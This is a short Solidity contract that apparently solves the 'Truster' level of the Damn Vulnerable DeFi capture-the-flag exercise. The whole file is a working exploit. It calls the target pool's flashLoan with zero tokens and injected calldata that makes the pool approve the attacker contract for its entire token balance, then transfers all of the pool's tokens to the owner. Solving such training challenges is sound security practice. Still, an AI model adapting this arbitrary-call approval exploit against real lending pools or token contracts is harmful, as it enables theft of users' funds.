// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ExploitTruster is Ownable {
    using Address for address;

    address private immutable tP;
    IERC20 private immutable damnValuableToken;

    constructor(address _targetPool, address _damnValuableToken) {
        tP = _targetPool;
        damnValuableToken = IERC20(_damnValuableToken);
    }

    function execute() external onlyOwner {
        uint256 amountToSteal = damnValuableToken.balanceOf(tP);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amountToSteal
        );

        tP.functionCall(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0,
                address(this),
                address(damnValuableToken),
                data
            )
        );

        require(
            damnValuableToken.transferFrom(tP, owner(), amountToSteal),
            "EXPLOIT: Transfer from failed"
        );
    }
}
